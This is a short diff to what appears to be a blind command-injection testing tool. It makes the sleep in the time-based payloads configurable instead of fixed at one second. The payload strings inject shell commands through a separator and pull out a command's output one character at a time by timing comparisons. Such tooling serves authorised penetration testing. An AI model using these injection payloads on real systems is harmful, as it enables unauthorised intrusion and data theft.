@@ -46,7 +46,7 @@ def decision(separator,TAG,j,delay,http_request_method):
 	      # Find the length of the output.
 	      "str1=${#str} " + separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
-	      "sleep 1 "
+	      "sleep " + str(delay) + " "
 	      )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
@@ -85,7 +85,7 @@ def cmd_execution(separator,cmd,j,delay,http_request_method):
 	      # Find the length of the output.
 	      "str1=${#str}  " + separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
-	      "sleep 1 "
+	      "sleep " + str(delay) + " "
 	      )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
@@ -118,7 +118,7 @@ def get_char(separator,cmd,i,ascii_char,delay,http_request_method):
 	      "sleep 0  " + separator + " "
 	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
 	      "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
-	      "sleep 1 "
+	      "sleep " + str(delay) + " "
 	      )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
